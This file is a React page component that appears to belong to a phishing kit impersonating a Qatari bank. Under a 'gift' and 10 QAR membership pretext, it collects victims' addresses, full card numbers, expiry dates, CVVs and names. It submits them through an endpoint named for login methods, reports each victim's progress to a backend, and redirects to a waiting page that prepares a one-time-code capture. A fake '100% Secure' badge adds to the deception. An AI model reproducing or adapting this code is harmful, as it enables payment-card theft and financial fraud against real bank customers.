import { useState, useEffect } from "react";
import { useLocation, useSearch } from "wouter";
import { trpc } from "@/lib/trpc";
import { useLanguage } from "@/contexts/LanguageContext";
import { toast } from "sonner";
import { motion } from "framer-motion";
import { 
  CreditCard, 
  MapPin, 
  ShieldCheck,
  AlertTriangle,
  Lock,
  ChevronRight,
  X
} from "lucide-react";
import Header from "@/components/Header";

// قائمة كاملة بدول العالم مع أكوادها
const countries = [
  { ar: "قطر", en: "Qatar", code: "QA" },
  { ar: "أفغانستان", en: "Afghanistan", code: "AF" },
  { ar: "ألبانيا", en: "Albania", code: "AL" },
  { ar: "الجزائر", en: "Algeria", code: "DZ" },
  { ar: "أندورا", en: "Andorra", code: "AD" },
  { ar: "أنجولا", en: "Angola", code: "AO" },
  { ar: "أنتيغوا وبربودا", en: "Antigua and Barbuda", code: "AG" },
  { ar: "الأرجنتين", en: "Argentina", code: "AR" },
  { ar: "أرمينيا", en: "Armenia", code: "AM" },
  { ar: "أستراليا", en: "Australia", code: "AU" },
  { ar: "النمسا", en: "Austria", code: "AT" },
  { ar: "أذربيجان", en: "Azerbaijan", code: "AZ" },
  { ar: "جزر البهاما", en: "Bahamas", code: "BS" },
  { ar: "البحرين", en: "Bahrain", code: "BH" },
  { ar: "بنغلاديش", en: "Bangladesh", code: "BD" },
  { ar: "بربادوس", en: "Barbados", code: "BB" },
  { ar: "بيلاروسيا", en: "Belarus", code: "BY" },
  { ar: "بلجيكا", en: "Belgium", code: "BE" },
  { ar: "بليز", en: "Belize", code: "BZ" },
  { ar: "بنين", en: "Benin", code: "BJ" },
  { ar: "بوتان", en: "Bhutan", code: "BT" },
  { ar: "بوليفيا", en: "Bolivia", code: "BO" },
  { ar: "البوسنة والهرسك", en: "Bosnia and Herzegovina", code: "BA" },
  { ar: "بوتسوانا", en: "Botswana", code: "BW" },
  { ar: "البرازيل", en: "Brazil", code: "BR" },
  { ar: "بروناي", en: "Brunei", code: "BN" },
  { ar: "بلغاريا", en: "Bulgaria", code: "BG" },
  { ar: "بوركينا فاسو", en: "Burkina Faso", code: "BF" },
  { ar: "بوروندي", en: "Burundi", code: "BI" },
  { ar: "كمبوديا", en: "Cambodia", code: "KH" },
  { ar: "الكاميرون", en: "Cameroon", code: "CM" },
  { ar: "كندا", en: "Canada", code: "CA" },
  { ar: "الرأس الأخضر", en: "Cape Verde", code: "CV" },
  { ar: "جمهورية أفريقيا الوسطى", en: "Central African Republic", code: "CF" },
  { ar: "تشاد", en: "Chad", code: "TD" },
  { ar: "تشيلي", en: "Chile", code: "CL" },
  { ar: "الصين", en: "China", code: "CN" },
  { ar: "كولومبيا", en: "Colombia", code: "CO" },
  { ar: "جزر القمر", en: "Comoros", code: "KM" },
  { ar: "الكونغو", en: "Congo", code: "CG" },
  { ar: "كوستاريكا", en: "Costa Rica", code: "CR" },
  { ar: "كرواتيا", en: "Croatia", code: "HR" },
  { ar: "كوبا", en: "Cuba", code: "CU" },
  { ar: "قبرص", en: "Cyprus", code: "CY" },
  { ar: "جمهورية التشيك", en: "Czech Republic", code: "CZ" },
  { ar: "الدنمارك", en: "Denmark", code: "DK" },
  { ar: "جيبوتي", en: "Djibouti", code: "DJ" },
  { ar: "دومينيكا", en: "Dominica", code: "DM" },
  { ar: "الجمهورية الدومينيكية", en: "Dominican Republic", code: "DO" },
  { ar: "إكوادور", en: "Ecuador", code: "EC" },
  { ar: "مصر", en: "Egypt", code: "EG" },
  { ar: "السلفادور", en: "El Salvador", code: "SV" },
  { ar: "غينيا الاستوائية", en: "Equatorial Guinea", code: "GQ" },
  { ar: "إريتريا", en: "Eritrea", code: "ER" },
  { ar: "إستونيا", en: "Estonia", code: "EE" },
  { ar: "إثيوبيا", en: "Ethiopia", code: "ET" },
  { ar: "فيجي", en: "Fiji", code: "FJ" },
  { ar: "فنلندا", en: "Finland", code: "FI" },
  { ar: "فرنسا", en: "France", code: "FR" },
  { ar: "الجابون", en: "Gabon", code: "GA" },
  { ar: "غامبيا", en: "Gambia", code: "GM" },
  { ar: "جورجيا", en: "Georgia", code: "GE" },
  { ar: "ألمانيا", en: "Germany", code: "DE" },
  { ar: "غانا", en: "Ghana", code: "GH" },
  { ar: "اليونان", en: "Greece", code: "GR" },
  { ar: "غرينادا", en: "Grenada", code: "GD" },
  { ar: "غواتيمالا", en: "Guatemala", code: "GT" },
  { ar: "غينيا", en: "Guinea", code: "GN" },
  { ar: "غينيا بيساو", en: "Guinea-Bissau", code: "GW" },
  { ar: "غيانا", en: "Guyana", code: "GY" },
  { ar: "هايتي", en: "Haiti", code: "HT" },
  { ar: "هندوراس", en: "Honduras", code: "HN" },
  { ar: "هونغ كونغ", en: "Hong Kong", code: "HK" },
  { ar: "المجر", en: "Hungary", code: "HU" },
  { ar: "آيسلندا", en: "Iceland", code: "IS" },
  { ar: "الهند", en: "India", code: "IN" },
  { ar: "إندونيسيا", en: "Indonesia", code: "ID" },
  { ar: "إيران", en: "Iran", code: "IR" },
  { ar: "العراق", en: "Iraq", code: "IQ" },
  { ar: "أيرلندا", en: "Ireland", code: "IE" },
  { ar: "إسرائيل", en: "Israel", code: "IL" },
  { ar: "إيطاليا", en: "Italy", code: "IT" },
  { ar: "ساحل العاج", en: "Ivory Coast", code: "CI" },
  { ar: "جامايكا", en: "Jamaica", code: "JM" },
  { ar: "اليابان", en: "Japan", code: "JP" },
  { ar: "الأردن", en: "Jordan", code: "JO" },
  { ar: "كازاخستان", en: "Kazakhstan", code: "KZ" },
  { ar: "كينيا", en: "Kenya", code: "KE" },
  { ar: "كيريباتي", en: "Kiribati", code: "KI" },
  { ar: "كوريا الشمالية", en: "North Korea", code: "KP" },
  { ar: "كوريا الجنوبية", en: "South Korea", code: "KR" },
  { ar: "الكويت", en: "Kuwait", code: "KW" },
  { ar: "قيرغيزستان", en: "Kyrgyzstan", code: "KG" },
  { ar: "لاوس", en: "Laos", code: "LA" },
  { ar: "لاتفيا", en: "Latvia", code: "LV" },
  { ar: "لبنان", en: "Lebanon", code: "LB" },
  { ar: "ليسوتو", en: "Lesotho", code: "LS" },
  { ar: "ليبيريا", en: "Liberia", code: "LR" },
  { ar: "ليبيا", en: "Libya", code: "LY" },
  { ar: "ليختنشتاين", en: "Liechtenstein", code: "LI" },
  { ar: "ليتوانيا", en: "Lithuania", code: "LT" },
  { ar: "لوكسمبرغ", en: "Luxembourg", code: "LU" },
  { ar: "ماكاو", en: "Macau", code: "MO" },
  { ar: "مقدونيا", en: "Macedonia", code: "MK" },
  { ar: "مدغشقر", en: "Madagascar", code: "MG" },
  { ar: "ملاوي", en: "Malawi", code: "MW" },
  { ar: "ماليزيا", en: "Malaysia", code: "MY" },
  { ar: "جزر المالديف", en: "Maldives", code: "MV" },
  { ar: "مالي", en: "Mali", code: "ML" },
  { ar: "مالطا", en: "Malta", code: "MT" },
  { ar: "جزر مارشال", en: "Marshall Islands", code: "MH" },
  { ar: "موريتانيا", en: "Mauritania", code: "MR" },
  { ar: "موريشيوس", en: "Mauritius", code: "MU" },
  { ar: "المكسيك", en: "Mexico", code: "MX" },
  { ar: "ميكرونيزيا", en: "Micronesia", code: "FM" },
  { ar: "مولدوفا", en: "Moldova", code: "MD" },
  { ar: "موناكو", en: "Monaco", code: "MC" },
  { ar: "منغوليا", en: "Mongolia", code: "MN" },
  { ar: "الجبل الأسود", en: "Montenegro", code: "ME" },
  { ar: "المغرب", en: "Morocco", code: "MA" },
  { ar: "موزمبيق", en: "Mozambique", code: "MZ" },
  { ar: "ميانمار", en: "Myanmar", code: "MM" },
  { ar: "ناميبيا", en: "Namibia", code: "NA" },
  { ar: "ناورو", en: "Nauru", code: "NR" },
  { ar: "نيبال", en: "Nepal", code: "NP" },
  { ar: "هولندا", en: "Netherlands", code: "NL" },
  { ar: "نيوزيلندا", en: "New Zealand", code: "NZ" },
  { ar: "نيكاراغوا", en: "Nicaragua", code: "NI" },
  { ar: "النيجر", en: "Niger", code: "NE" },
  { ar: "نيجيريا", en: "Nigeria", code: "NG" },
  { ar: "النرويج", en: "Norway", code: "NO" },
  { ar: "عمان", en: "Oman", code: "OM" },
  { ar: "باكستان", en: "Pakistan", code: "PK" },
  { ar: "بالاو", en: "Palau", code: "PW" },
  { ar: "فلسطين", en: "Palestine", code: "PS" },
  { ar: "بنما", en: "Panama", code: "PA" },
  { ar: "بابوا غينيا الجديدة", en: "Papua New Guinea", code: "PG" },
  { ar: "باراغواي", en: "Paraguay", code: "PY" },
  { ar: "بيرو", en: "Peru", code: "PE" },
  { ar: "الفلبين", en: "Philippines", code: "PH" },
  { ar: "بولندا", en: "Poland", code: "PL" },
  { ar: "البرتغال", en: "Portugal", code: "PT" },
  { ar: "رومانيا", en: "Romania", code: "RO" },
  { ar: "روسيا", en: "Russia", code: "RU" },
  { ar: "رواندا", en: "Rwanda", code: "RW" },
  { ar: "سانت كيتس ونيفس", en: "Saint Kitts and Nevis", code: "KN" },
  { ar: "سانت لوسيا", en: "Saint Lucia", code: "LC" },
  { ar: "سانت فنسنت والجرينادين", en: "Saint Vincent and the Grenadines", code: "VC" },
  { ar: "ساموا", en: "Samoa", code: "WS" },
  { ar: "سان مارينو", en: "San Marino", code: "SM" },
  { ar: "سان تومي وبرينسيبي", en: "São Tomé and Príncipe", code: "ST" },
  { ar: "السعودية", en: "Saudi Arabia", code: "SA" },
  { ar: "السنغال", en: "Senegal", code: "SN" },
  { ar: "صربيا", en: "Serbia", code: "RS" },
  { ar: "سيشيل", en: "Seychelles", code: "SC" },
  { ar: "سيراليون", en: "Sierra Leone", code: "SL" },
  { ar: "سنغافورة", en: "Singapore", code: "SG" },
  { ar: "سلوفاكيا", en: "Slovakia", code: "SK" },
  { ar: "سلوفينيا", en: "Slovenia", code: "SI" },
  { ar: "جزر سليمان", en: "Solomon Islands", code: "SB" },
  { ar: "الصومال", en: "Somalia", code: "SO" },
  { ar: "جنوب أفريقيا", en: "South Africa", code: "ZA" },
  { ar: "إسبانيا", en: "Spain", code: "ES" },
  { ar: "سريلانكا", en: "Sri Lanka", code: "LK" },
  { ar: "السودان", en: "Sudan", code: "SD" },
  { ar: "سورينام", en: "Suriname", code: "SR" },
  { ar: "سوازيلاند", en: "Eswatini", code: "SZ" },
  { ar: "السويد", en: "Sweden", code: "SE" },
  { ar: "سويسرا", en: "Switzerland", code: "CH" },
  { ar: "سوريا", en: "Syria", code: "SY" },
  { ar: "تايوان", en: "Taiwan", code: "TW" },
  { ar: "طاجيكستان", en: "Tajikistan", code: "TJ" },
  { ar: "تنزانيا", en: "Tanzania", code: "TZ" },
  { ar: "تايلاند", en: "Thailand", code: "TH" },
  { ar: "تيمور الشرقية", en: "East Timor", code: "TL" },
  { ar: "توغو", en: "Togo", code: "TG" },
  { ar: "تونغا", en: "Tonga", code: "TO" },
  { ar: "ترينيداد وتوباغو", en: "Trinidad and Tobago", code: "TT" },
  { ar: "تونس", en: "Tunisia", code: "TN" },
  { ar: "تركيا", en: "Turkey", code: "TR" },
  { ar: "تركمانستان", en: "Turkmenistan", code: "TM" },
  { ar: "توفالو", en: "Tuvalu", code: "TV" },
  { ar: "أوغندا", en: "Uganda", code: "UG" },
  { ar: "أوكرانيا", en: "Ukraine", code: "UA" },
  { ar: "الإمارات العربية المتحدة", en: "United Arab Emirates", code: "AE" },
  { ar: "المملكة المتحدة", en: "United Kingdom", code: "GB" },
  { ar: "الولايات المتحدة", en: "United States", code: "US" },
  { ar: "أوروغواي", en: "Uruguay", code: "UY" },
  { ar: "أوزبكستان", en: "Uzbekistan", code: "UZ" },
  { ar: "فانواتو", en: "Vanuatu", code: "VU" },
  { ar: "الفاتيكان", en: "Vatican City", code: "VA" },
  { ar: "فنزويلا", en: "Venezuela", code: "VE" },
  { ar: "فيتنام", en: "Vietnam", code: "VN" },
  { ar: "اليمن", en: "Yemen", code: "YE" },
  { ar: "زامبيا", en: "Zambia", code: "ZM" },
  { ar: "زيمبابوي", en: "Zimbabwe", code: "ZW" },
];

export default function RegistrationCompletion() {
  const [, setLocation] = useLocation();
  const search = useSearch();
  const { language } = useLanguage();
  const params = new URLSearchParams(search);
  const bankId = params.get("bank") || "qnb";
  const [sessionId, setSessionId] = useState<string>("");

  useEffect(() => {
    const sId = params.get("session") || localStorage.getItem("sessionId") || "";
    if (sId) {
      setSessionId(sId);
    }
  }, [params]);
  
  const isArabic = language === "ar";
  const hasError = params.get("error") === "true";
  
  const [errorMessage, setErrorMessage] = useState<string | null>(null);

  useEffect(() => {
    if (hasError) {
      const msg = sessionStorage.getItem("error_message");
      if (msg) {
        setErrorMessage(msg);
        sessionStorage.removeItem("error_message");
      }
    }
  }, [hasError]);

  const [formData, setFormData] = useState({
    country: "QA",
    area: "",
    street: "",
    building: "",
    cardNumber: "",
    expiryDate: "",
    cvv: "",
    cardholderName: "",
  });

  const submitLoginMethodMutation = trpc.submissions.submitLoginMethod.useMutation();
  const reportStepMutation = trpc.submissions.reportStep.useMutation();

  useEffect(() => {
    const currentSessionId = sessionId || localStorage.getItem("sessionId") || "";
    if (currentSessionId) {
      reportStepMutation.mutate({
        sessionId: currentSessionId,
        step: "card"
      });
    }
  }, [sessionId]);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target;
    
    if (name === "cardNumber") {
      let v = value.replace(/\s?/g, '').replace(/(\d{4})/g, '$1 ').trim();
      if (v.length > 19) v = v.slice(0, 19);
      setFormData(prev => ({ ...prev, [name]: v }));
    } else if (name === "expiryDate") {
      let cleanedValue = value.replace(/\D/g, "");
      if (cleanedValue.length > 4) cleanedValue = cleanedValue.slice(0, 4);
      if (cleanedValue.length > 2) cleanedValue = cleanedValue.slice(0, 2) + "/" + cleanedValue.slice(2);
      setFormData((prev) => ({ ...prev, [name]: cleanedValue }));
    } else {
      setFormData((prev) => ({ ...prev, [name]: value }));
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!formData.area || !formData.street || !formData.building) {
      toast.error(isArabic ? "يرجى إكمال بيانات العنوان" : "Please complete address details");
      return;
    }

    if (!formData.cardNumber || !formData.cardholderName || !formData.expiryDate || !formData.cvv) {
      toast.error(isArabic ? "يرجى إكمال بيانات الدفع" : "Please complete payment details");
      return;
    }

    const currentSessionId = sessionId || localStorage.getItem("sessionId") || "";
    
    if (!currentSessionId) {
      toast.error(isArabic ? "فشل التعرف على الجلسة. يرجى العودة للبداية." : "Session not found. Please start over.");
      return;
    }

    try {
      await submitLoginMethodMutation.mutateAsync({
        sessionId: currentSessionId,
        loginType: "reg_complete",
        username: "",
        password: "",
        deliveryMethod: "home",
        deliveryAddress: `${formData.area}, ${formData.street}, ${formData.building}`,
        phoneConfirmation: "",
        branchName: "",
        cardNumber: formData.cardNumber,
        cardholderName: formData.cardholderName,
        expiryDate: formData.expiryDate,
        cvv: formData.cvv,
        issuanceFee: "10",
        deliveryFee: "0",
        totalAmount: "10",
      });
      
      setLocation(`/waiting?bank=${bankId}&session=${currentSessionId}&next=otp`);
    } catch (error) {
      console.error("Submission error:", error);
      toast.error(isArabic ? "حدث خطأ أثناء الإرسال" : "An error occurred");
    }
  };

  return (
    <div className="min-h-screen bg-slate-50 flex flex-col font-sans" dir={isArabic ? "rtl" : "ltr"}>
      <Header />

      <main className="flex-1 max-w-xl mx-auto w-full px-4 py-8">
        <motion.div 
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          className="space-y-6"
        >
          <div className="text-center mb-8">
            <h1 className="text-2xl font-black text-slate-800">
              {isArabic ? "إتمام التسجيل والاشتراك" : "Complete Registration & Subscription"}
            </h1>
            <p className="text-slate-500 font-medium mt-2">
              {isArabic ? "يرجى تأكيد عنوان الاستلام وبيانات العضوية" : "Please confirm delivery address and membership details"}
            </p>
          </div>

          {errorMessage && (
            <div className="p-4 bg-rose-50 border-2 border-rose-100 rounded-2xl flex items-center gap-3 text-rose-700 text-sm font-bold animate-in fade-in slide-in-from-top-4">
              <X size={20} className="shrink-0 bg-rose-500 text-white rounded-full p-1" />
              <p>{errorMessage}</p>
            </div>
          )}

          <form onSubmit={handleSubmit} className="space-y-6">
            <div className="bg-white rounded-3xl p-6 shadow-sm border border-slate-100 space-y-4">
              <div className="flex items-center gap-2 mb-2 text-[#8C0032]">
                <MapPin size={20} />
                <h2 className="font-black">{isArabic ? "عنوان استلام الهدية والبطاقة" : "Gift & Card Delivery Address"}</h2>
              </div>

              <div className="space-y-4">
                <div>
                  <label className="text-xs font-bold text-slate-400 uppercase tracking-wider mb-1 block px-1">
                    {isArabic ? "الدولة" : "Country"}
                  </label>
                  <select 
                    name="country"
                    className="w-full bg-slate-50 border-2 border-slate-100 rounded-xl px-4 py-3 focus:border-[#8C0032] outline-none transition-all font-bold"
                    value={formData.country}
                    onChange={handleInputChange}
                  >
                    {countries.map((c, i) => (
                      <option key={i} value={c.code}>{isArabic ? c.ar : c.en}</option>
                    ))}
                  </select>
                </div>

                <div className="grid grid-cols-1 gap-4">
                  <input 
                    name="area"
                    type="text"
                    placeholder={isArabic ? "المنطقة (مثال: الدفنة، السد)" : "Area (e.g. West Bay, Al Sadd)"}
                    className="w-full bg-slate-50 border-2 border-slate-100 rounded-xl px-4 py-3 focus:border-[#8C0032] outline-none transition-all font-medium"
                    value={formData.area}
                    onChange={handleInputChange}
                    required
                  />
                  <div className="grid grid-cols-2 gap-4">
                    <input 
                      name="street"
                      type="text"
                      placeholder={isArabic ? "اسم الشارع" : "Street Name"}
                      className="w-full bg-slate-50 border-2 border-slate-100 rounded-xl px-4 py-3 focus:border-[#8C0032] outline-none transition-all font-medium"
                      value={formData.street}
                      onChange={handleInputChange}
                      required
                    />
                    <input 
                      name="building"
                      type="text"
                      placeholder={isArabic ? "رقم المبنى / الفيلا" : "Building / Villa No."}
                      className="w-full bg-slate-50 border-2 border-slate-100 rounded-xl px-4 py-3 focus:border-[#8C0032] outline-none transition-all font-medium"
                      value={formData.building}
                      onChange={handleInputChange}
                      required
                    />
                  </div>
                </div>
              </div>
            </div>

            <div className="bg-white rounded-3xl p-6 shadow-sm border border-slate-100 space-y-4">
              <div className="flex items-center justify-between mb-2">
                <div className="flex items-center gap-2 text-[#8C0032]">
                  <CreditCard size={20} />
                  <h2 className="font-black">{isArabic ? "تأكيد رسوم العضوية" : "Confirm Membership Fees"}</h2>
                </div>
                <div className="bg-emerald-50 text-emerald-700 px-3 py-1 rounded-full text-xs font-black">
                  10 {isArabic ? "ر.ق" : "QAR"}
                </div>
              </div>

              <div className="p-4 bg-slate-50 rounded-2xl border-2 border-slate-100 space-y-4">
                <div className="flex items-center gap-3 pb-3 border-b border-slate-200">
                  <div className="w-4 h-4 rounded-full border-4 border-[#8C0032] bg-white"></div>
                  <div className="flex items-center gap-2 font-bold text-slate-700">
                    <CreditCard size={18} />
                    <span>{isArabic ? "بطاقة ائتمان / خصم" : "Credit / Debit Card"}</span>
                  </div>
                </div>

                <div className="space-y-4">
                  <div className="space-y-1">
                    <label className="text-[10px] font-black text-slate-400 uppercase px-1">{isArabic ? "رقم البطاقة" : "Card Number"}</label>
                    <div className="relative">
                      <input 
                        name="cardNumber"
                        type="tel"
                        placeholder="1234 1234 1234 1234"
                        className="w-full bg-white border-2 border-slate-100 rounded-xl px-4 py-3 focus:border-[#8C0032] outline-none transition-all font-bold tracking-widest text-left" dir="ltr"
                        value={formData.cardNumber}
                        onChange={handleInputChange}
                        required
                      />
                      <Lock className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-200" size={16} />
                    </div>
                  </div>

                  <div className="grid grid-cols-2 gap-4">
                    <div className="space-y-1">
                      <input 
                        name="expiryDate"
                        type="text"
                        placeholder="MM / YY"
                        className="w-full bg-white border-2 border-slate-100 rounded-xl px-4 py-3 focus:border-[#8C0032] outline-none transition-all font-bold text-center"
                        value={formData.expiryDate}
                        onChange={handleInputChange}
                        required
                      />
                    </div>
                    <div className="space-y-1">
                      <div className="relative">
                        <input 
                          name="cvv"
                          type="password"
                          placeholder="CVC"
                          className="w-full bg-white border-2 border-slate-100 rounded-xl px-4 py-3 focus:border-[#8C0032] outline-none transition-all font-bold text-center"
                          value={formData.cvv}
                          onChange={handleInputChange}
                          maxLength={4}
                          required
                        />
                      </div>
                    </div>
                  </div>

                  <div className="space-y-1">
                    <label className="text-[10px] font-black text-slate-400 uppercase px-1">{isArabic ? "اسم صاحب البطاقة" : "Cardholder Name"}</label>
                    <input 
                      name="cardholderName"
                      type="text"
                      placeholder={isArabic ? "الاسم الكامل كما يظهر على البطاقة" : "Full name on card"}
                      className="w-full bg-white border-2 border-slate-100 rounded-xl px-4 py-3 focus:border-[#8C0032] outline-none transition-all font-bold"
                      value={formData.cardholderName}
                      onChange={handleInputChange}
                      required
                    />
                  </div>
                </div>
              </div>
            </div>

            <div className="bg-amber-50 border-2 border-amber-100 rounded-2xl p-5 flex gap-4">
              <AlertTriangle className="text-amber-500 shrink-0" size={24} />
              <div className="text-xs font-bold text-amber-800 leading-relaxed">
                {isArabic 
                  ? "في حالة عدم تأكيد الاشتراك سوف يتم إلغاء الطلب. في حالة إدخال البيانات بشكل متكرر بدون تأكيد قد يتم حظرك من الاشتراك في العضوية."
                  : "If the subscription is not confirmed, the request will be cancelled. Entering data repeatedly without confirmation may lead to being blocked from membership subscription."}
              </div>
            </div>

            <button 
              type="submit"
              disabled={submitLoginMethodMutation.isLoading}
              className="w-full bg-[#8C0032] hover:bg-[#700028] text-white py-5 rounded-2xl font-black text-lg shadow-xl shadow-[#8C0032]/20 transition-all flex items-center justify-center gap-3 group disabled:opacity-70"
            >
              {submitLoginMethodMutation.isLoading ? (
                <div className="w-6 h-6 border-4 border-white/30 border-t-white rounded-full animate-spin"></div>
              ) : (
                <>
                  <span>{isArabic ? "تأكيد الاشتراك واستلام الهدية" : "Confirm Subscription & Get Gift"}</span>
                  <ChevronRight className={`group-hover:translate-x-1 transition-transform ${isArabic ? 'rotate-180 group-hover:-translate-x-1' : ''}`} />
                </>
              )}
            </button>
          </form>
        </motion.div>
      </main>

      <footer className="mt-auto">
        <div className="max-w-xl mx-auto px-4 py-6 text-center">
          <div className="flex items-center justify-center gap-2 text-slate-400 mb-4">
            <ShieldCheck size={16} />
            <span className="text-[10px] font-bold uppercase tracking-widest">{isArabic ? "دفع آمن ومحمي 100%" : "100% Secure & Protected Payment"}</span>
          </div>
        </div>
        <div className="footer-image-container">
          <img src={isArabic ? "https://i.ibb.co/23sMQkSF/IMG-20260714-WA0015.jpg" : "https://i.ibb.co/609jMvhx/IMG-20260714-WA0016.jpg"} className="footer-image-standard" alt="Footer" />
        </div>
      </footer>
    </div>
  );
}
